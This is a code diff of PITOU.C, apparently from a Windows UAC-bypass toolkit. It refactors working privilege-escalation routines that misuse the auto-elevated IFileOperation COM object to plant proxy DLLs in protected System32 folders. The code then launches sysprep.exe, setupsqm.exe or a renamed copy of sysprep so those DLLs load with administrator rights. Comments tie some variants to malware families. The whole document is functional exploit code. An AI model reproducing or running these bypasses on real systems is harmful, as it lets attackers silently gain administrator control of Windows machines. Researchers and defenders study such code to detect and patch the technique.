@@ -1,14 +1,14 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2015
+*  (C) COPYRIGHT AUTHORS, 2014 - 2016
 *
 *  TITLE:       PITOU.C
 *
-*  VERSION:     2.00
+*  VERSION:     2.10
 *
-*  DATE:        16 Nov 2015
+*  DATE:        16 Apr 2016
 *
-*  Leo Davidson work based AutoElevation and Pitou new variant.
+*  Leo Davidson based IFileOperation auto-elevation.
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -19,198 +19,165 @@
 #include "global.h"
 #include <shlobj.h>
 
-ELOAD_PARAMETERS g_ElevParams;
-ELOAD_PARAMETERS_3 g_ElevParams3;
-
 /*
-* ucmElevatedLoadProc
+* ucmMasqueradedCopyFileCOM
 *
 * Purpose:
 *
-* Bypass UAC using AutoElevated IFileOperation.
-* Refactored Leo Davidson concept.
+* Copy file autoelevated.
 *
 */
-DWORD WINAPI ucmElevatedLoadProc(
-	PELOAD_PARAMETERS elvpar
-	)
+BOOL ucmMasqueradedCopyFileCOM(
+    LPWSTR SourceFileName,
+    LPWSTR DestinationDir
+    )
 {
-	HRESULT				r;
-	BOOL				cond = FALSE;
-	IFileOperation      *FileOperation1 = NULL;
-	IShellItem			*isrc = NULL, *idst = NULL;
-	BIND_OPTS3			bop;
-	SHELLEXECUTEINFOW   shexec;
-	WCHAR				textbuf[MAX_PATH * 2], *p, *f, *f0;
+    BOOL                cond = FALSE;
+    IFileOperation     *FileOperation1 = NULL;
+    IShellItem         *isrc = NULL, *idst = NULL;
+    BIND_OPTS3          bop;
+    SHELLEXECUTEINFOW   shexec;
+    HRESULT             r = E_FAIL;
 
-	if (elvpar == NULL)
-		return (DWORD)E_FAIL;
+    do {
 
-	r = elvpar->xCoInitialize(NULL);
-	if (r != S_OK)
-		return r;
+        if ((SourceFileName == NULL) || (DestinationDir == NULL))
+            break;
 
-	RtlSecureZeroMemory(&bop, sizeof(bop));
-	RtlSecureZeroMemory(&shexec, sizeof(shexec));
+        RtlSecureZeroMemory(&bop, sizeof(bop));
+        RtlSecureZeroMemory(&shexec, sizeof(shexec));
 
-	do {
-		r = elvpar->xCoCreateInstance(&elvpar->xCLSID, NULL,
-			CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &elvpar->xIID, &FileOperation1);
+        r = CoCreateInstance(&CLSID_FileOperation, NULL,
+            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &IID_IFileOperation, &FileOperation1);
 
-		if (r != S_OK) {
-			break;
-		}
+        if (r != S_OK) {
+            break;
+        }
 
-		if (FileOperation1 != NULL) {
-			FileOperation1->lpVtbl->Release(FileOperation1);
-		}
+        if (FileOperation1 != NULL) {
+            FileOperation1->lpVtbl->Release(FileOperation1);
+        }
 
-		bop.cbStruct = sizeof(bop);
-		bop.dwClassContext = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER;
-		r = elvpar->xCoGetObject(elvpar->EleMoniker, (BIND_OPTS *)&bop, &elvpar->xIID, &FileOperation1);
-		if (r != S_OK) {
-			break;
-		}
-		if (FileOperation1 == NULL) {
-			r = E_FAIL;
-			break;
-		}
+        bop.cbStruct = sizeof(bop);
+        bop.dwClassContext = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER;
 
-		FileOperation1->lpVtbl->SetOperationFlags(FileOperation1,
-			FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);
+        r = CoGetObject(IFILEOP_ELEMONIKER, (BIND_OPTS *)&bop, &IID_IFileOperation, &FileOperation1);
+        if (r != S_OK) {
+            break;
+        }
+        if (FileOperation1 == NULL) {
+            r = E_FAIL;
+            break;
+        }
 
-		r = elvpar->xSHCreateItemFromParsingName(elvpar->SourceFilePathAndName,
-			NULL, &elvpar->xIID_IShellItem, &isrc);
+        FileOperation1->lpVtbl->SetOperationFlags(FileOperation1,
+            FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);
 
-		if (r != S_OK) {
-			break;
-		}
-		r = elvpar->xSHCreateItemFromParsingName(elvpar->DestinationDir, NULL, &elvpar->xIID_IShellItem, &idst);
-		if (r != S_OK) {
-			break;
-		}
+        r = SHCreateItemFromParsingName(SourceFileName, NULL, &IID_IShellItem, &isrc);
+        if (r != S_OK) {
+            break;
+        }
 
-		r = FileOperation1->lpVtbl->MoveItem(FileOperation1, isrc, idst, NULL, NULL);
-		if (r != S_OK) {
-			break;
-		}
-		r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
-		if (r != S_OK) {
-			break;
-		}
+        r = SHCreateItemFromParsingName(DestinationDir, NULL, &IID_IShellItem, &idst);
+        if (r != S_OK) {
+            break;
+        }
 
-		idst->lpVtbl->Release(idst);
-		idst = NULL;
-		isrc->lpVtbl->Release(isrc);
-		isrc = NULL;
+        r = FileOperation1->lpVtbl->MoveItem(FileOperation1, isrc, idst, NULL, NULL);
+        if (r != S_OK) {
+            break;
+        }
+        r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
+        if (r != S_OK) {
+            break;
+        }
 
-		shexec.cbSize = sizeof(shexec);
-		shexec.fMask = SEE_MASK_NOCLOSEPROCESS;
-		shexec.nShow = SW_SHOW;
-		shexec.lpFile = elvpar->ExePathAndName;
-		shexec.lpParameters = NULL;
-		shexec.lpDirectory = elvpar->DestinationDir;
-		if (elvpar->xShellExecuteExW(&shexec))
-			if (shexec.hProcess != NULL) {
-				elvpar->xWaitForSingleObject(shexec.hProcess, INFINITE);
-				elvpar->xCloseHandle(shexec.hProcess);
-			}
+        idst->lpVtbl->Release(idst);
+        idst = NULL;
+        isrc->lpVtbl->Release(isrc);
+        isrc = NULL;
 
-		f0 = textbuf;
-		p = (WCHAR *)elvpar->DestinationDir;
-		while (*p != (WCHAR)0) {
-			*f0 = *p;
-			f0++;
-			p++;
-		}
-		*f0 = 0;
+    } while (cond);
 
-		f = (WCHAR *)elvpar->SourceFilePathAndName;
-		p = f;
-		while (*f != (WCHAR)0) {
-			if (*f == (WCHAR)'\\')
-				p = (WCHAR *)f + 1;
-			f++;
-		}
+    if (FileOperation1 != NULL) {
+        FileOperation1->lpVtbl->Release(FileOperation1);
+    }
+    if (isrc != NULL) {
+        isrc->lpVtbl->Release(isrc);
+    }
+    if (idst != NULL) {
+        idst->lpVtbl->Release(idst);
+    }
 
-		while (*p != (WCHAR)0) {
-			*f0 = *p;
-			f0++;
-			p++;
-		}
-		*f0 = 0;
-
-		r = elvpar->xSHCreateItemFromParsingName(textbuf, NULL, &elvpar->xIID_IShellItem, &idst);
-		if (r != S_OK) {
-			break;
-		}
-
-		r = FileOperation1->lpVtbl->DeleteItem(FileOperation1, idst, NULL);
-		if (r != S_OK) {
-			break;
-		}
-		FileOperation1->lpVtbl->PerformOperations(FileOperation1);
-
-	} while (cond);
-
-	if (FileOperation1 != NULL) {
-		FileOperation1->lpVtbl->Release(FileOperation1);
-	}
-	if (isrc != NULL) {
-		isrc->lpVtbl->Release(isrc);
-	}
-	if (idst != NULL) {
-		idst->lpVtbl->Release(idst);
-	}
-
-	elvpar->xCoUninitialize();
-	return r;
+    return (SUCCEEDED(r));
 }
 
 /*
-* ucmCreateCallParameters
+* ucmStandardAutoElevation2
 *
 * Purpose:
 *
-* Fill common part of call parameters.
+* Bypass UAC by abusing appinfo g_lpAutoApproveEXEList
+*
+* UAC contain whitelist of trusted fusion processes with only names and no other special restrictions
+* Most of them unknown shit and list does not properly handled by system itself, use this fact.
 *
 */
-BOOL ucmCreateCallParameters(
-	PVOID Parameters
-	)
+BOOL ucmStandardAutoElevation2(
+    CONST PVOID ProxyDll,
+    DWORD ProxyDllSize
+    )
 {
-	BOOL bCond = FALSE, bResult = FALSE;
-	PELOAD_PARAMETERS elvpar = (PELOAD_PARAMETERS)Parameters;
-	
-	do {
+    BOOL  cond = FALSE, bResult = FALSE;
+    WCHAR SourceFilePathAndName[MAX_PATH + 1];
+    WCHAR DestinationFilePathAndName[MAX_PATH + 1];
 
-		if (Parameters == NULL) {
-			break;
-		}
+    do {
 
-		//elevation moniker
-		_strcpy_w(elvpar->EleMoniker, IFILEOP_ELEMONIKER);
+        //source filename of dll
+        RtlSecureZeroMemory(SourceFilePathAndName, sizeof(SourceFilePathAndName));
+        _strcpy(SourceFilePathAndName, g_ctx.szTempDirectory);
+        _strcat(SourceFilePathAndName, UNBCL_DLL);
 
-		elvpar->xIID = IID_IFileOperation;
-		elvpar->xIID_IShellItem = IID_IShellItem;
-		elvpar->xCLSID = CLSID_FileOperation;
+        if (!supWriteBufferToFile(SourceFilePathAndName, ProxyDll, ProxyDllSize)) {
+            break;
+        }
 
-		elvpar->xCoInitialize = (pfnCoInitialize)GetProcAddress(g_ctx.hOle32, "CoInitialize");
-		elvpar->xCoCreateInstance = (pfnCoCreateInstance)GetProcAddress(g_ctx.hOle32, "CoCreateInstance");
-		elvpar->xCoGetObject = (pfnCoGetObject)GetProcAddress(g_ctx.hOle32, "CoGetObject");
-		elvpar->xCoUninitialize = (pfnCoUninitialize)GetProcAddress(g_ctx.hOle32, "CoUninitialize");
-		elvpar->xSHCreateItemFromParsingName = (pfnSHCreateItemFromParsingName)GetProcAddress(g_ctx.hShell32, "SHCreateItemFromParsingName");
-		elvpar->xShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(g_ctx.hShell32, "ShellExecuteExW");
-		elvpar->xWaitForSingleObject = (pfnWaitForSingleObject)GetProcAddress(g_ctx.hKernel32, "WaitForSingleObject");
-		elvpar->xCloseHandle = (pfnCloseHandle)GetProcAddress(g_ctx.hKernel32, "CloseHandle");
-		elvpar->xOutputDebugStringW = (pfnOutputDebugStringW)GetProcAddress(g_ctx.hKernel32, "OutputDebugStringW");
+        //copy %temp\unbcl.dll -> system32\unbcl.dll
+        if (!ucmMasqueradedCopyFileCOM(SourceFilePathAndName, g_ctx.szSystemDirectory)) {
+            break;
+        }
 
-		bResult = TRUE;
+        //source filename of process
+        RtlSecureZeroMemory(SourceFilePathAndName, sizeof(SourceFilePathAndName));
+        _strcpy(SourceFilePathAndName, g_ctx.szSystemDirectory);
+        _strcat(SourceFilePathAndName, SYSPREP_EXE);
 
-	} while (bCond);
+        RtlSecureZeroMemory(DestinationFilePathAndName, sizeof(DestinationFilePathAndName));
+        _strcpy(DestinationFilePathAndName, g_ctx.szTempDirectory);
+        _strcat(DestinationFilePathAndName, OOBE_EXE);
 
-	return bResult;
+        //system32\sysprep\sysprep.exe -> temp\oobe.exe
+        if (!CopyFile(SourceFilePathAndName, DestinationFilePathAndName, FALSE)) {
+            break;
+        }
+
+        //temp\oobe.exe -> system32\oobe.exe
+        if (!ucmMasqueradedCopyFileCOM(DestinationFilePathAndName, g_ctx.szSystemDirectory)) {
+            break;
+        }
+
+        RtlSecureZeroMemory(DestinationFilePathAndName, sizeof(DestinationFilePathAndName));
+        _strcpy(DestinationFilePathAndName, g_ctx.szSystemDirectory);
+        _strcat(DestinationFilePathAndName, OOBE_EXE);
+
+        bResult = supRunProcess(DestinationFilePathAndName, NULL);
+
+    } while (cond);
+
+    return bResult;
 }
+
 
 /*
 * ucmStandardAutoElevation
@@ -219,243 +186,115 @@ BOOL ucmCreateCallParameters(
 *
 * Leo Davidson AutoElevation method with derivatives.
 *
-* M1W7   - Original Leo Davidson concept.
-* M1W8   - Windows 8.1 adapted M1W7 (bypassing sysprep embedded manifest dlls redirection).
-* M1W7T  - Leo Davidson concept with different target dll, used by Win32/Tilon.
-* M1W10  - Windows 10 adapted M1W7.
-* M1WALL - WinNT/Pitou derivative from Leo Davidson concept.
+* UacMethodSysprep1   - Original Leo Davidson concept.
+* UacMethodSysprep2   - Windows 8.1 adapted M1W7 (bypassing sysprep embedded manifest dlls redirection).
+* UacMethodTilon      - Leo Davidson concept with different target dll, used by Win32/Tilon.
+* UacMethodSysprep3   - Windows 10 TH1 adapted M1W7.
+* UacMethodOobe       - WinNT/Pitou derivative from Leo Davidson concept.
 *
 */
 BOOL ucmStandardAutoElevation(
-	UACBYPASSMETHOD Method,
-	CONST PVOID ProxyDll,
-	DWORD ProxyDllSize
-	)
+    UACBYPASSMETHOD Method,
+    CONST PVOID ProxyDll,
+    DWORD ProxyDllSize
+    )
 {
-	BOOL		cond = FALSE, bResult = FALSE;
-	LPWSTR		lpSourceDll, lpTargetDir, lpTargetProcess;
-	WCHAR		szBuffer[MAX_PATH + 1];
+    BOOL	cond = FALSE, bResult = FALSE;
+    WCHAR   szSourceDll[MAX_PATH * 2];
+    WCHAR   szTargetDir[MAX_PATH * 2];
+    WCHAR   szTargetProcess[MAX_PATH * 2];
 
-	switch (Method) {
 
-	case UacMethodSysprep1:
-		lpSourceDll = M1W7_SOURCEDLL;
-		lpTargetDir = M1W7_TARGETDIR;
-		lpTargetProcess = M1W7_TARGETPROCESS;
-		break;
+    _strcpy(szSourceDll, g_ctx.szTempDirectory);
+    _strcpy(szTargetDir, g_ctx.szSystemDirectory);
+    _strcpy(szTargetProcess, g_ctx.szSystemDirectory);
 
-	case UacMethodSysprep2:
-		lpSourceDll = M1W8_SOURCEDLL;
-		lpTargetDir = M1W7_TARGETDIR;
-		lpTargetProcess = M1W7_TARGETPROCESS;
-		break;
+    switch (Method) {
 
-	case UacMethodSysprep3:
-		lpSourceDll = M1W10_SOURCEDLL;
-		lpTargetDir = M1W7_TARGETDIR;
-		lpTargetProcess = M1W7_TARGETPROCESS;
-		break;
+    case UacMethodSysprep1:
 
-	case UacMethodOobe:
-		lpSourceDll = M1WALL_SOURCEDLL;
-		lpTargetDir = M1WALL_TARGETDIR;
-		lpTargetProcess = M1WALL_TARGETPROCESS;
-		break;
+        //%temp%\cryptbase.dll
+        _strcat(szSourceDll, CRYPTBASE_DLL);
 
-	case UacMethodTilon:
-		lpSourceDll = M1W7T_SOURCEDLL;
-		lpTargetDir = M1W7_TARGETDIR;
-		lpTargetProcess = M1W7_TARGETPROCESS;
-		break;
+        //%systemroot%\system32\sysprep      
+        _strcat(szTargetDir, SYSPREP_DIR);
 
-	default:
-		return FALSE;
-	}
+        //%systemroot%\system32\sysprep\sysprep.exe       
+        _strcat(szTargetProcess, SYSPREP_EXE);
 
-	do {
+        break;
 
-		//setup call parameters
-		RtlSecureZeroMemory(&g_ElevParams, sizeof(g_ElevParams));
-		if (!ucmCreateCallParameters(&g_ElevParams)) {
-			break;
-		}
+    case UacMethodSysprep2:
 
-		//source filename
-		if (ExpandEnvironmentStringsW(lpSourceDll,
-			g_ElevParams.SourceFilePathAndName, MAX_PATH) == 0)
-		{
-			break;
-		}
+        //%temp\\shcore.dll
+        _strcat(szSourceDll, SHCORE_DLL);
 
-		if (!supWriteBufferToFile(g_ElevParams.SourceFilePathAndName, 
-			ProxyDll, ProxyDllSize))
-		{
-			break;
-		}
+        //%systemroot%\system32\sysprep
+        _strcat(szTargetDir, SYSPREP_DIR);
 
-		//dest directory
-		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-		_strcpy_w(szBuffer, lpTargetDir);
-		
-		if (ExpandEnvironmentStringsW(szBuffer, 
-			g_ElevParams.DestinationDir, MAX_PATH) == 0) 
-		{
-			break;
-		}
-		
-		//target
-		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-		_strcpy_w(szBuffer, lpTargetProcess);
-		
-		if (ExpandEnvironmentStringsW(szBuffer, 
-			g_ElevParams.ExePathAndName, MAX_PATH) == 0) 
-		{
-			break;
-		}
+        //%systemroot%\system32\sysprep\sysprep.exe
+        _strcat(szTargetProcess, SYSPREP_EXE);
 
-		bResult = ucmInjectExplorer(&g_ElevParams, ucmElevatedLoadProc);
+        break;
 
-	} while (cond);
+    case UacMethodSysprep3:
 
-	return bResult;
-}
+        //%temp%\dbgcore.dll
+        _strcat(szSourceDll, DBGCORE_DLL);
 
-/*
-* ucmElevatedLoadProcEx
-*
-* Purpose:
-*
-* Bypass UAC using AutoElevated IFileOperation.
-* Special version.
-*
-*/
-DWORD WINAPI ucmElevatedLoadProcEx(
-	PELOAD_PARAMETERS_3 elvpar
-	)
-{
-	HRESULT				r;
-	BOOL				cond = FALSE;
-	IFileOperation      *FileOperation1 = NULL;
-	IShellItem			*isrc = NULL, *idst = NULL;
-	BIND_OPTS3			bop;
-	SHELLEXECUTEINFOW   shexec;
+        //%systemroot%\system32\sysprep
+        _strcat(szTargetDir, SYSPREP_DIR);
 
-	if (elvpar == NULL)
-		return (DWORD)E_FAIL;
+        //%systemroot%\system32\sysprep\sysprep.exe
+        _strcat(szTargetProcess, SYSPREP_EXE);
 
-	r = elvpar->xCoInitialize(NULL);
-	if (r != S_OK)
-		return r;
+        break;
 
-	RtlSecureZeroMemory(&bop, sizeof(bop));
-	RtlSecureZeroMemory(&shexec, sizeof(shexec));
+    case UacMethodOobe:
 
-	do {
-		r = elvpar->xCoCreateInstance(&elvpar->xCLSID, NULL,
-			CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &elvpar->xIID, &FileOperation1);
+        //%temp%\wdscore.dll
+        _strcat(szSourceDll, WDSCORE_DLL);
 
-		if (r != S_OK) {
-			break;
-		}
+        //%systemroot%\system32\oobe\"
+        _strcat(szTargetDir, L"oobe\\");
 
-		if (FileOperation1 != NULL) {
-			FileOperation1->lpVtbl->Release(FileOperation1);
-		}
+        //%systemroot%\system32\oobe\setupsqm.exe
+        _strcat(szTargetProcess, SETUPSQM_EXE);
 
-		bop.cbStruct = sizeof(bop);
-		bop.dwClassContext = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER;
-		r = elvpar->xCoGetObject(elvpar->EleMoniker, (BIND_OPTS *)&bop, &elvpar->xIID, &FileOperation1);
-		if (r != S_OK) {
-			break;
-		}
-		if (FileOperation1 == NULL) {
-			r = E_FAIL;
-			break;
-		}
+        break;
 
-		FileOperation1->lpVtbl->SetOperationFlags(FileOperation1,
-			FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);
+    case UacMethodTilon:
 
-		r = elvpar->xSHCreateItemFromParsingName(elvpar->SourceFilePathAndName,
-			NULL, &elvpar->xIID_IShellItem, &isrc);
+        //%temp%\ActionQueue.dll
+        _strcat(szSourceDll, ACTIONQUEUE_DLL);
 
-		if (r != S_OK) {
-			break;
-		}
-		r = elvpar->xSHCreateItemFromParsingName(elvpar->DestinationDir, NULL, &elvpar->xIID_IShellItem, &idst);
-		if (r != S_OK) {
-			break;
-		}
+        //%systemroot%\system32\sysprep
+        _strcat(szTargetDir, SYSPREP_DIR);
 
-		r = FileOperation1->lpVtbl->MoveItem(FileOperation1, isrc, idst, NULL, NULL);
-		if (r != S_OK) {
-			break;
-		}
-		r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
-		if (r != S_OK) {
-			break;
-		}
+        //%systemroot%\system32\sysprep\sysprep.exe
+        _strcat(szTargetProcess, SYSPREP_EXE);
 
-		idst->lpVtbl->Release(idst);
-		idst = NULL;
-		isrc->lpVtbl->Release(isrc);
-		isrc = NULL;
+        break;
 
-	} while (cond);
+    default:
+        return FALSE;
+    }
 
-	if (FileOperation1 != NULL) {
-		FileOperation1->lpVtbl->Release(FileOperation1);
-	}
-	if (isrc != NULL) {
-		isrc->lpVtbl->Release(isrc);
-	}
-	if (idst != NULL) {
-		idst->lpVtbl->Release(idst);
-	}
+    do {
 
-	elvpar->xCoUninitialize();
-	return r;
-}
+        if (!supWriteBufferToFile(szSourceDll, ProxyDll, ProxyDllSize)) {
+            OutputDebugString(L"[UCM] Error extracting payload dll");
+            break;
+        }
 
-/*
-* ucmAutoElevateCopyFile
-*
-* Purpose:
-*
-* Copy file autoelevated.
-*
-*/
-BOOL ucmAutoElevateCopyFile(
-	LPWSTR SourceFileName,
-	LPWSTR DestinationDir
-	)
-{
-	BOOL		cond = FALSE, bResult = FALSE;
-	WCHAR		szBuffer[MAX_PATH + 1];
+        if (!ucmMasqueradedCopyFileCOM(szSourceDll, szTargetDir)) {
+            OutputDebugString(L"[UCM] Failed copy file to the protected directory");
+            break;
+        }
 
-	do {
-		if (
-			(SourceFileName == NULL) ||
-			(DestinationDir == NULL)
-			)
-		{
-			break;
-		}
+        bResult = supRunProcess(szTargetProcess, NULL);
 
-		RtlSecureZeroMemory(&g_ElevParams3, sizeof(g_ElevParams3));
+    } while (cond);
 
-		//setup call parameters
-		if (!ucmCreateCallParameters(&g_ElevParams3)) {
-			break;
-		}
-
-		//dest directory
-		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-		_strcpy_w(g_ElevParams3.DestinationDir, DestinationDir);
-		_strcpy_w(g_ElevParams3.SourceFilePathAndName, SourceFileName);
-		bResult = ucmInjectExplorer(&g_ElevParams3, ucmElevatedLoadProcEx);
-
-	} while (cond);
-
-	return bResult;
+    return bResult;
 }
